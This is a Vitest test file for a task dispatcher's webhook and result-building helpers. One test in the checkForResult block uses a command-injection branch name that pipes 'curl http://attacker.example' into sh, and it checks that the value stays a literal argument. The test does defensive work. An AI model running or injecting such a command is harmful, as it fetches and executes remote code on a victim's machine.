import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { SKIP_SENTRY_KEY } from '@intexuraos/infra-sentry';
import {
  sendSetupFailureWebhook,
  buildResultFromVerification,
  enrichResultForResumedTask,
  checkForResult,
  type CheckForResultExecFile,
  type CheckForResultReadFile,
} from '../../../services/task-dispatcher/webhook-callbacks.js';
import type { Task, TaskResult } from '../../../types/task.js';
import type { CreateTaskRequest } from '../../../types/api.js';
import type { CompletionVerifierVerdict } from '../../../services/completion-verifier.js';

const mockLogger = {
  info: vi.fn(),
  warn: vi.fn(),
  error: vi.fn(),
  debug: vi.fn(),
  child: vi.fn(),
};

function createMockWebhookClient(): { send: ReturnType<typeof vi.fn> } {
  return { send: vi.fn().mockResolvedValue({ ok: true, value: undefined }) };
}

function makeRequest(overrides: Partial<CreateTaskRequest> = {}): CreateTaskRequest {
  return {
    taskId: 'task-1',
    workerType: 'sonnet' as CreateTaskRequest['workerType'],
    prompt: 'do work',
    webhookUrl: 'https://example.test/webhook/internal/webhooks/task-complete',
    webhookSecret: 'secret',
    linearIssueLabels: [],
    hasChildren: false,
    ...overrides,
  } as CreateTaskRequest;
}

function makeTask(overrides: Partial<Task> = {}): Task {
  return {
    taskId: 'task-1',
    workerType: 'sonnet' as Task['workerType'],
    prompt: 'do work',
    repository: 'pbuchman/intexuraos',
    baseBranch: 'development',
    webhookUrl: 'https://example.test/webhook',
    webhookSecret: 'secret',
    status: 'running',
    worktreePath: '/tmp/wt',
    containerId: 'container-1',
    linearIssueLabels: [],
    startedAt: new Date(0).toISOString(),
    attemptCount: 1,
    maxAttempts: 3,
    verificationHistory: [],
    ...overrides,
  };
}

// Reset all logger spy state between tests so call-history from one describe
// block cannot leak into another.
beforeEach(() => {
  mockLogger.info.mockReset();
  mockLogger.warn.mockReset();
  mockLogger.error.mockReset();
  mockLogger.debug.mockReset();
  mockLogger.child.mockReset();
});

describe('sendSetupFailureWebhook', () => {
  it('posts a failed webhook with SETUP_FAILED code and duration 0', async () => {
    const webhook = createMockWebhookClient();
    const request = makeRequest();
    await sendSetupFailureWebhook(
      webhook as never,
      mockLogger as never,
      request,
      'worktree create failed',
      new Error('EACCES')
    );
    expect(webhook.send).toHaveBeenCalledWith({
      url: request.webhookUrl,
      secret: request.webhookSecret,
      payload: {
        taskId: request.taskId,
        status: 'failed',
        error: {
          code: 'SETUP_FAILED',
          message: 'worktree create failed',
        },
        duration: 0,
      },
      taskId: request.taskId,
    });
  });

  it('logs but does not throw when the webhook rejects', async () => {
    const webhook = createMockWebhookClient();
    webhook.send.mockRejectedValueOnce(new Error('network'));
    await sendSetupFailureWebhook(
      webhook as never,
      mockLogger as never,
      makeRequest(),
      'container start failed',
      new Error('docker down')
    );
    expect(mockLogger.error).toHaveBeenCalledWith(
      expect.objectContaining({ taskId: 'task-1' }),
      'Failed to send setup failure webhook'
    );
  });
});

describe('buildResultFromVerification [INT-1470 deterministic verdict shape]', () => {
  function parsedVerdict(data: Record<string, unknown>): CompletionVerifierVerdict {
    return {
      kind: 'parsed',
      data,
      missingRequired: [],
      telemetryMissing: [],
      warnings: [],
    };
  }

  it('returns the base git result untouched when data is empty', () => {
    const task = makeTask();
    const gitResult: TaskResult = { branch: 'feature/x', commits: 2 };
    const result = buildResultFromVerification(task, gitResult, parsedVerdict({}));
    expect(result).toEqual({ branch: 'feature/x', commits: 2 });
  });

  it('is a no-op when the verdict is kind=hard-error', () => {
    const task = makeTask();
    const gitResult: TaskResult = { branch: 'feature/x' };
    const hardError: CompletionVerifierVerdict = {
      kind: 'hard-error',
      code: 'TASK_RUNTIME_HARD_ERROR',
      message: 'nope',
    };
    expect(buildResultFromVerification(task, gitResult, hardError)).toEqual({
      branch: 'feature/x',
    });
  });

  it('overlays planning fields when agentType=planning', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        outcome: 'planned',
        summary: 'Planned it',
        superpowers_writing_plans_used: true,
        linear_issue: 'https://linear.app/x',
        plan_doc: true,
        plan_pr: 'https://github.com/pr/1',
        clarification_message: '',
      }),
      'planning'
    );
    expect(result.summary).toBe('Planned it');
    expect(result.planning_outcome_label).toBe('planned');
    expect(result.planning_superpowers_writing_plans_used).toBe('1');
    expect(result.planning_linear_url).toBe('https://linear.app/x');
    expect(result.planning_pr_url).toBe('https://github.com/pr/1');
  });

  it('maps planning results without complex or subtask fields', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        outcome: 'planned',
        superpowers_writing_plans_used: true,
        linear_issue: 'https://linear.app/pbuchman/issue/INT-1841/example',
        plan_doc: true,
        plan_pr: 'https://github.com/pbuchman/intexuraos/pull/1',
        clarification_message: '',
        summary: 'done',
      }),
      'planning'
    );

    expect(result.planning_outcome_label).toBe('planned');
    expect(result.planning_has_plan_doc).toBe('1');
    expect(result.planning_pr_url).toBe('https://github.com/pbuchman/intexuraos/pull/1');
    expect(result.planning_is_complex).toBeUndefined();
    expect(result.planning_subtask_urls).toBeUndefined();
  });

  it('records planning flag as "0" when not-used and skips empty plan_pr', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        outcome: 'planned',
        summary: 'Planned it',
        superpowers_writing_plans_used: false,
        linear_issue: 'https://linear.app/x',
        plan_doc: false,
        plan_pr: '',
        clarification_message: 'why',
      }),
      'planning'
    );
    expect(result.planning_superpowers_writing_plans_used).toBe('0');
    expect(result.planning_pr_url).toBeUndefined();
  });

  it('overlays execution fields and injects linear issue url', () => {
    const task = makeTask({ linearIssueId: 'INT-123' });
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        outcome: 'implemented',
        summary: 'Shipped',
        superpowers_subagent_driven_dev_used: true,
        superpowers_requesting_code_review_used: false,
        pr: 'https://github.com/pr/9',
        memory_ids_used: ['mem_a'],
        memory_ids_rejected: [],
        memory_usage_summary: 'one',
      }),
      'execution'
    );
    expect(result.prUrl).toBe('https://github.com/pr/9');
    expect(result.execution_outcome_label).toBe('implemented');
    expect(result.execution_superpowers_subagent_driven_dev_used).toBe('1');
    expect(result.execution_superpowers_requesting_code_review_used).toBe('0');
    expect(result.execution_linear_issue_url).toBe('https://linear.app/pbuchman/issue/INT-123');
    expect(result.execution_memory_ids_used).toBe('mem_a');
  });

  it('execution: records flags as "0" when not-used and skips empty pr + missing linearIssueId', () => {
    const task = makeTask(); // no linearIssueId
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        outcome: 'failed',
        summary: 'Shipped',
        superpowers_subagent_driven_dev_used: false,
        superpowers_requesting_code_review_used: true,
        pr: '',
      }),
      'execution'
    );
    expect(result.execution_superpowers_subagent_driven_dev_used).toBe('0');
    expect(result.execution_superpowers_requesting_code_review_used).toBe('1');
    expect(result.prUrl).toBeUndefined();
    expect(result.execution_linear_issue_url).toBeUndefined();
  });

  it('overlays review fields (pr, ids, counters — review_body/inline_comments no longer emitted)', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Reviewed',
        pr: 'https://github.com/pr/42',
        review_id: 'rev-1',
        review_comments_posted: 3,
        review_types: ['code', 'test'],
        requirements_tracker_updated: 'true',
        gh_actions_status: 'success',
        needs_remediation: false,
      }),
      'review'
    );
    expect(result.prUrl).toBe('https://github.com/pr/42');
    expect(result.review_id).toBe('rev-1');
    expect(result.review_comments_posted).toBe('3');
    expect(result.review_types).toBe('code,test');
    expect(result.requirements_tracker_updated).toBe('true');
    expect(result.gh_actions_status).toBe('success');
    expect(result.needs_remediation).toBe('0');
  });

  it('skips empty optional review pr and omits review_id when blank', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Reviewed',
        pr: '',
        review_id: '',
        review_comments_posted: 0,
        review_types: ['code'],
        requirements_tracker_updated: 'false',
        gh_actions_status: 'pending',
        needs_remediation: false,
      }),
      'review'
    );
    expect(result.prUrl).toBeUndefined();
    expect(result.review_id).toBeUndefined();
  });

  it('overlays remediation fields (pr, outcome, requires_re_review)', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Remediated',
        outcome: 'implemented',
        pr: 'https://github.com/pr/77',
        requires_re_review: true,
      }),
      'remediation'
    );
    expect(result.execution_outcome_label).toBe('implemented');
    expect(result.prUrl).toBe('https://github.com/pr/77');
    expect(result.requires_re_review).toBe('1');
  });

  it('remediation: skips empty pr', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Remediated',
        outcome: 'already_completed',
        pr: '',
        requires_re_review: false,
      }),
      'remediation'
    );
    expect(result.prUrl).toBeUndefined();
    expect(result.requires_re_review).toBe('0');
  });

  it('overlays pull_request fields (pr, comment_replied=yes)', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Replied',
        pr: 'https://github.com/pr/55',
        comment_replied: 'yes',
      }),
      'pull_request'
    );
    expect(result.prUrl).toBe('https://github.com/pr/55');
    expect(result.comment_replied).toBe(true);
  });

  it('overlays Sentry fields including PR, issue URLs, outcome, and verification evidence', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Fixed a Sentry issue',
        outcome: 'fixed',
        pr: 'https://github.com/pbuchman/intexuraos/pull/123',
        sentry_issue: 'https://intexura.sentry.io/issues/123456/',
        linear_issue: 'https://linear.app/pbuchman/issue/INT-123/sentry-typeerror',
        verification: 'pnpm --dir apps/code-agent test sentry',
      }),
      'sentry'
    );

    expect(result.prUrl).toBe('https://github.com/pbuchman/intexuraos/pull/123');
    expect(result.sentry_issue_url).toBe('https://intexura.sentry.io/issues/123456/');
    expect(result.sentry_linear_issue).toBe(
      'https://linear.app/pbuchman/issue/INT-123/sentry-typeerror'
    );
    expect(result.sentry_outcome).toBe('fixed');
    expect(result.sentry_verification).toBe('pnpm --dir apps/code-agent test sentry');
  });

  it('infers Sentry result fields and omits empty PR or invalid successful outcome', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Sentry task failed before code changes',
        outcome: 'failed',
        pr: '',
        sentry_issue: 'https://intexura.sentry.io/issues/123456/',
        linear_issue: 'https://linear.app/pbuchman/issue/INT-123/sentry-typeerror',
        verification: 'not run',
      })
    );

    expect(result.prUrl).toBeUndefined();
    expect(result.sentry_outcome).toBeUndefined();
    expect(result.sentry_issue_url).toBe('https://intexura.sentry.io/issues/123456/');
    expect(result.sentry_linear_issue).toBe(
      'https://linear.app/pbuchman/issue/INT-123/sentry-typeerror'
    );
    expect(result.sentry_verification).toBe('not run');
  });

  it('pull_request: treats non-yes comment_replied as false', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'No reply',
        pr: '',
        comment_replied: 'no',
      }),
      'pull_request'
    );
    expect(result.prUrl).toBeUndefined();
    expect(result.comment_replied).toBe(false);
  });

  it('[INT-1470 coverage] infers agentType=planning from plan_pr presence when omitted', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Planned',
        outcome: 'planned',
        plan_pr: 'https://github.com/pr/1',
      })
    );
    expect(result.planning_outcome_label).toBe('planned');
  });

  it('[INT-1470 coverage] infers agentType=pull_request from tracking_comment_id presence', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'PR',
        tracking_comment_id: '42',
        pr: 'https://github.com/pr/1',
        comment_replied: 'yes',
      })
    );
    expect(result.prUrl).toBe('https://github.com/pr/1');
    expect(result.comment_replied).toBe(true);
  });

  it('[INT-1470 coverage] infers agentType=review from review_id presence', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Reviewed',
        review_id: 'rev-1',
        pr: 'https://github.com/pr/1',
      })
    );
    expect(result.review_id).toBe('rev-1');
  });

  it('[INT-1470 coverage] infers agentType=remediation from requires_re_review presence', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Remediated',
        outcome: 'implemented',
        requires_re_review: true,
        pr: 'https://github.com/pr/1',
      })
    );
    expect(result.requires_re_review).toBe('1');
  });

  it('[INT-1470 coverage] arrayToCsv: coerces non-string array members via String()', () => {
    // Exercise the `typeof v === 'string' ? v : String(v)` branch in arrayToCsv.
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'S',
        memory_ids_used: ['mem_a', 42, { toString: (): string => 'obj' }],
        memory_ids_rejected: [],
        memory_usage_summary: '',
      })
    );
    expect(result.execution_memory_ids_used).toBe('mem_a,42,obj');
  });

  it('[INT-1470 coverage] arrayToCsv: accepts string as-is (not an array)', () => {
    // Exercise the `typeof value === 'string'` branch in arrayToCsv.
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'S',
        memory_ids_used: 'mem_pre,mem_post', // already a csv string
        memory_ids_rejected: [],
        memory_usage_summary: '',
      })
    );
    expect(result.execution_memory_ids_used).toBe('mem_pre,mem_post');
  });

  it('[INT-1470 coverage] planning: outcome=unclear sets planning_outcome_label', () => {
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Unclear',
        outcome: 'unclear',
      }),
      'planning'
    );
    expect(result.planning_outcome_label).toBe('unclear');
  });

  it('[INT-1470 coverage] review: review_comments_posted accepts string as-is', () => {
    // Exercise the `typeof reviewCommentsPosted === 'string'` branch.
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Reviewed',
        review_id: 'rev-1',
        review_comments_posted: '7',
        pr: 'https://github.com/pr/1',
      }),
      'review'
    );
    expect(result.review_comments_posted).toBe('7');
  });

  it('[INT-1470 coverage] planning: outcome not in {planned, unclear} is not labeled', () => {
    // Exercise the false-branch of `outcome === 'planned' || outcome === 'unclear'`.
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Planning',
        outcome: 'something-else',
      }),
      'planning'
    );
    expect(result.planning_outcome_label).toBeUndefined();
  });

  it('[INT-1470 coverage] remediation: outcome not in {implemented, already_completed} is not labeled', () => {
    // Exercise the false-branch of
    // `outcome === 'implemented' || outcome === 'already_completed'`.
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Remediated',
        outcome: 'weird',
        pr: 'https://github.com/pr/1',
        requires_re_review: false,
      }),
      'remediation'
    );
    expect(result.execution_outcome_label).toBeUndefined();
  });

  it('[INT-1470 coverage] infers agentType=execution when no dispatch key is present and default-overlays exec fields', () => {
    // Exercise the final-fallback branch `: 'execution'` in the inference
    // ternary. No `plan_pr`/`tracking_comment_id`/`review_id`/`requires_re_review`
    // keys — defaults to execution.
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Done',
        outcome: 'implemented',
        pr: 'https://github.com/pr/1',
      })
    );
    expect(result.execution_outcome_label).toBe('implemented');
    expect(result.prUrl).toBe('https://github.com/pr/1');
  });

  it('[INT-1470 coverage] ask_agent: no overlay path — falls through every else-if branch without mutation', () => {
    // Exercise the implicit-else fall-through arm of the final
    // `else if (inferredType === 'pull_request')` condition. BuildResultAgentType
    // includes 'ask_agent', for which no overlay applies; every inference
    // arm (planning/execution/review/remediation/pull_request) must return
    // false and the base result must be unchanged beyond the summary/memory
    // pass-through set earlier.
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Asked',
        memory_ids_used: [],
        memory_ids_rejected: [],
        memory_usage_summary: '',
      }),
      'ask_agent'
    );
    expect(result.summary).toBe('Asked');
    // None of the agent-specific fields should be set.
    expect(result.planning_outcome_label).toBeUndefined();
    expect(result.execution_outcome_label).toBeUndefined();
    expect(result.review_id).toBeUndefined();
    expect(result.requires_re_review).toBeUndefined();
    expect(result.prUrl).toBeUndefined();
    expect(result.comment_replied).toBeUndefined();
  });

  it('[INT-1470 coverage] remediation: requires_re_review with non-bool value is dropped', () => {
    // Exercise the `requiresReReview === undefined` arm
    // (boolToBoolZeroOne returns undefined for non-bool / non-'0'/'1').
    const task = makeTask();
    const result = buildResultFromVerification(
      task,
      undefined,
      parsedVerdict({
        summary: 'Remediated',
        outcome: 'implemented',
        pr: 'https://github.com/pr/1',
        requires_re_review: 'not-a-bool', // non-bool, non-'0'/'1' → undefined
      }),
      'remediation'
    );
    expect(result.requires_re_review).toBeUndefined();
  });
});

describe('enrichResultForResumedTask', () => {
  it('returns undefined when result is undefined', () => {
    expect(enrichResultForResumedTask(makeTask(), undefined)).toBeUndefined();
  });

  it('adds execution_linear_issue_url for execution agents with a linear id', () => {
    const task = makeTask({ agentType: 'execution', linearIssueId: 'INT-9' });
    const result: TaskResult = {};
    const enriched = enrichResultForResumedTask(task, result);
    expect(enriched?.execution_linear_issue_url).toBe('https://linear.app/pbuchman/issue/INT-9');
  });

  it('backfills review fields from lastSuccessResult', () => {
    const lastSuccessResult: TaskResult = {
      review_id: 'rev-1',
      review_comments_posted: '2',
      review_types: 'code',
      requirements_tracker_updated: 'true',
      gh_actions_status: 'success',
      needs_remediation: '0',
    };
    const task = makeTask({ agentType: 'review', lastSuccessResult });
    const result: TaskResult = {};
    const enriched = enrichResultForResumedTask(task, result);
    expect(enriched).toMatchObject(lastSuccessResult);
  });

  it('does not overwrite existing review fields when already populated', () => {
    const lastSuccessResult: TaskResult = {
      review_id: 'rev-old',
      review_comments_posted: '1',
      review_types: 'old',
      requirements_tracker_updated: 'old',
      gh_actions_status: 'old',
      needs_remediation: 'old',
    };
    const task = makeTask({ agentType: 'review', lastSuccessResult });
    const existing: TaskResult = {
      review_id: 'rev-new',
      review_comments_posted: '9',
      review_types: 'new',
      requirements_tracker_updated: 'new',
      gh_actions_status: 'new',
      needs_remediation: 'new',
    };
    const enriched = enrichResultForResumedTask(task, { ...existing });
    expect(enriched).toMatchObject(existing);
  });

  it('backfills requires_re_review for remediation tasks from lastSuccessResult', () => {
    const task = makeTask({
      agentType: 'remediation',
      lastSuccessResult: { requires_re_review: '1' },
    });
    const enriched = enrichResultForResumedTask(task, {});
    expect(enriched?.requires_re_review).toBe('1');
  });

  it('does not overwrite an existing requires_re_review for remediation tasks', () => {
    const task = makeTask({
      agentType: 'remediation',
      lastSuccessResult: { requires_re_review: '0' },
    });
    const enriched = enrichResultForResumedTask(task, { requires_re_review: '1' });
    expect(enriched?.requires_re_review).toBe('1');
  });

  it('backfills comment_replied for pull_request tasks from lastSuccessResult', () => {
    const task = makeTask({
      agentType: 'pull_request',
      lastSuccessResult: { comment_replied: true },
    });
    const enriched = enrichResultForResumedTask(task, {});
    expect(enriched?.comment_replied).toBe(true);
  });

  it('does not overwrite an existing comment_replied for pull_request tasks', () => {
    const task = makeTask({
      agentType: 'pull_request',
      lastSuccessResult: { comment_replied: false },
    });
    const enriched = enrichResultForResumedTask(task, { comment_replied: true });
    expect(enriched?.comment_replied).toBe(true);
  });

  it('is a no-op when no agent-specific branch matches', () => {
    const task = makeTask();
    delete task.agentType;
    const result: TaskResult = { branch: 'feature/x' };
    expect(enrichResultForResumedTask(task, result)).toEqual({ branch: 'feature/x' });
  });
});

describe('checkForResult', () => {
  type ExecMatcher = (file: string, args: readonly string[]) => boolean;
  function makeExec(
    responses: [ExecMatcher, { stdout: string } | Error][]
  ): CheckForResultExecFile & { calls: { file: string; args: readonly string[] }[] } {
    const calls: { file: string; args: readonly string[] }[] = [];
    const fn: CheckForResultExecFile = async (file, args) => {
      calls.push({ file, args });
      for (const [match, response] of responses) {
        if (match(file, args)) {
          if (response instanceof Error) throw response;
          return response;
        }
      }
      throw new Error(`Unexpected exec command: ${file} ${args.join(' ')}`);
    };
    return Object.assign(fn, { calls });
  }

  function makeRead(content: string | Error): CheckForResultReadFile {
    return async (): Promise<string> => {
      if (content instanceof Error) throw content;
      return content;
    };
  }

  const isGhPrView =
    (n: number): ExecMatcher =>
    (file, args) =>
      file === 'gh' && args[0] === 'pr' && args[1] === 'view' && args[2] === String(n);
  const isGhPrList: ExecMatcher = (file, args) =>
    file === 'gh' && args[0] === 'pr' && args[1] === 'list';
  const isGitBranchShowCurrent: ExecMatcher = (file, args) =>
    file === 'git' && args[0] === 'branch' && args[1] === '--show-current';

  it('returns a TaskResult built from continuation PR data when the PR is OPEN and not merged', async () => {
    const task = makeTask({ continuationPrNumber: 42 });
    const exec = makeExec([
      [
        isGhPrView(42),
        {
          stdout: JSON.stringify({
            url: 'https://github.com/pr/42',
            number: 42,
            headRefName: 'feature/int-1425',
            title: 'Nitpick fixes',
            state: 'OPEN',
            mergedAt: null,
          }),
        },
      ],
    ]);
    const read = makeRead('{"attempted":true,"success":true,"conflictFiles":[]}');
    const result = await checkForResult(mockLogger as never, task, exec, read);
    expect(result).toEqual({
      branch: 'feature/int-1425',
      prUrl: 'https://github.com/pr/42',
      summary: 'Nitpick fixes',
      rebaseResult: { attempted: true, success: true, conflictFiles: [] },
    });
  });

  it('treats an absent mergedAt field as not-merged', async () => {
    const task = makeTask({ continuationPrNumber: 7 });
    const exec = makeExec([
      [
        isGhPrView(7),
        {
          stdout: JSON.stringify({
            url: 'https://github.com/pr/7',
            number: 7,
            headRefName: 'feature/int-1425',
            title: 'No mergedAt field',
            state: 'OPEN',
            // mergedAt omitted entirely -> undefined branch
          }),
        },
      ],
    ]);
    const read = makeRead('{}');
    const result = await checkForResult(mockLogger as never, task, exec, read);
    expect(result?.prUrl).toBe('https://github.com/pr/7');
    expect(result?.rebaseResult).toBeUndefined();
  });

  it('returns undefined when the continuation PR is merged', async () => {
    const task = makeTask({ continuationPrNumber: 42 });
    const exec = makeExec([
      [
        isGhPrView(42),
        {
          stdout: JSON.stringify({
            url: 'https://github.com/pr/42',
            number: 42,
            headRefName: 'feature/int-1425',
            title: 'Nitpick fixes',
            state: 'MERGED',
            mergedAt: '2026-04-22T00:00:00Z',
          }),
        },
      ],
    ]);
    const read = makeRead('{}');
    expect(await checkForResult(mockLogger as never, task, exec, read)).toBeUndefined();
  });

  it('returns undefined when the continuation PR parse fails (invalid JSON)', async () => {
    const task = makeTask({ continuationPrNumber: 42 });
    const exec = makeExec([[isGhPrView(42), { stdout: '{not-json' }]]);
    const read = makeRead('{}');
    expect(await checkForResult(mockLogger as never, task, exec, read)).toBeUndefined();
  });

  it('resolves branch/PR info from gh pr list when no continuationPrNumber is set', async () => {
    const task = makeTask();
    const exec = makeExec([
      [isGitBranchShowCurrent, { stdout: 'feature/int-1425\n' }],
      [
        isGhPrList,
        {
          stdout: JSON.stringify([
            {
              url: 'https://github.com/pr/99',
              number: 99,
              headRefName: 'feature/int-1425',
              title: 'branch-driven result',
              commits: [{ oid: 'abc', messageHeadline: 'init' }],
            },
          ]),
        },
      ],
    ]);
    const read = makeRead('{}');
    const result = await checkForResult(mockLogger as never, task, exec, read);
    expect(result?.prUrl).toBe('https://github.com/pr/99');
    expect(result?.branch).toBe('feature/int-1425');
    expect(result?.commits).toBe(1);
  });

  it('returns undefined when gh pr list yields no PRs', async () => {
    const task = makeTask();
    const exec = makeExec([
      [isGitBranchShowCurrent, { stdout: 'feature/int-1425\n' }],
      [isGhPrList, { stdout: '[]' }],
    ]);
    const read = makeRead('{}');
    expect(await checkForResult(mockLogger as never, task, exec, read)).toBeUndefined();
  });

  it('swallows exec errors and suppresses expected best-effort result checks from Sentry', async () => {
    const task = makeTask();
    const exec = makeExec([[isGitBranchShowCurrent, new Error('not a git repo')]]);
    const read = makeRead('{}');
    expect(await checkForResult(mockLogger as never, task, exec, read)).toBeUndefined();
    expect(mockLogger.error).not.toHaveBeenCalled();
    expect(mockLogger.warn).toHaveBeenCalledWith(
      expect.objectContaining({ taskId: 'task-1', [SKIP_SENTRY_KEY]: true }),
      'Failed to check for task result'
    );
  });

  it('passes attacker-controlled branch name as literal argv to gh pr list (no shell expansion)', async () => {
    const evilBranch = '"; curl http://attacker.example | sh; echo "';
    const task = makeTask();
    const exec = makeExec([
      [isGitBranchShowCurrent, { stdout: `${evilBranch}\n` }],
      [isGhPrList, { stdout: '[]' }],
    ]);
    const read = makeRead('{}');
    await checkForResult(mockLogger as never, task, exec, read);

    const ghCall = exec.calls.find(
      (c) => c.file === 'gh' && c.args[0] === 'pr' && c.args[1] === 'list'
    );
    expect(ghCall).toBeDefined();
    // The malicious branch must be a literal element in argv, never concatenated into one string.
    expect(ghCall?.args).toEqual([
      'pr',
      'list',
      '--head',
      evilBranch,
      '--json',
      'url,number,headRefName,title,commits',
      '--jq',
      '.',
    ]);
  });

  it('uses default readRebaseFile when not injected (real fs.readFile fails on non-existent path → undefined)', async () => {
    // Coverage: hit the default `readRebaseFile = (path) => readFile(path, 'utf8')` arm.
    // Pass a worktreePath that does not exist so the real readFile throws ENOENT
    // and we fall through to the catch with `rebaseOutput = '{}'`.
    //
    // Use mkdtempSync to allocate a guaranteed-empty dir, then point at a
    // non-existent subpath inside it — this avoids the previous flaky reliance
    // on a hard-coded /tmp path that another process could conceivably create.
    const tmpDir = mkdtempSync(join(tmpdir(), 'orchestrator-webhook-cb-test-'));
    try {
      const task = makeTask({
        continuationPrNumber: 42,
        worktreePath: join(tmpDir, 'never-here'),
      });
      const exec = makeExec([
        [
          isGhPrView(42),
          {
            stdout: JSON.stringify({
              url: 'https://github.com/pr/42',
              number: 42,
              headRefName: 'feature/int-1425',
              title: 'Default-read fallback',
              state: 'OPEN',
              mergedAt: null,
            }),
          },
        ],
      ]);
      // Omit readRebaseFile → exercises the default-arg branch in the source.
      const result = await checkForResult(mockLogger as never, task, exec);
      expect(result?.prUrl).toBe('https://github.com/pr/42');
      expect(result?.rebaseResult).toBeUndefined();
    } finally {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('returns rebase result undefined when readRebaseFile throws (continuation PR path)', async () => {
    const task = makeTask({ continuationPrNumber: 42 });
    const exec = makeExec([
      [
        isGhPrView(42),
        {
          stdout: JSON.stringify({
            url: 'https://github.com/pr/42',
            number: 42,
            headRefName: 'feature/int-1425',
            title: 'Nitpick fixes',
            state: 'OPEN',
            mergedAt: null,
          }),
        },
      ],
    ]);
    const read = makeRead(new Error('ENOENT'));
    const result = await checkForResult(mockLogger as never, task, exec, read);
    expect(result?.prUrl).toBe('https://github.com/pr/42');
    expect(result?.rebaseResult).toBeUndefined();
  });

  it('returns rebase result undefined when readRebaseFile throws (gh pr list path)', async () => {
    const task = makeTask();
    const exec = makeExec([
      [isGitBranchShowCurrent, { stdout: 'feature/int-1425\n' }],
      [
        isGhPrList,
        {
          stdout: JSON.stringify([
            {
              url: 'https://github.com/pr/99',
              number: 99,
              headRefName: 'feature/int-1425',
              title: 'branch-driven result',
              commits: [{ oid: 'abc', messageHeadline: 'init' }],
            },
          ]),
        },
      ],
    ]);
    const read = makeRead(new Error('ENOENT'));
    const result = await checkForResult(mockLogger as never, task, exec, read);
    expect(result?.prUrl).toBe('https://github.com/pr/99');
    expect(result?.rebaseResult).toBeUndefined();
  });
});
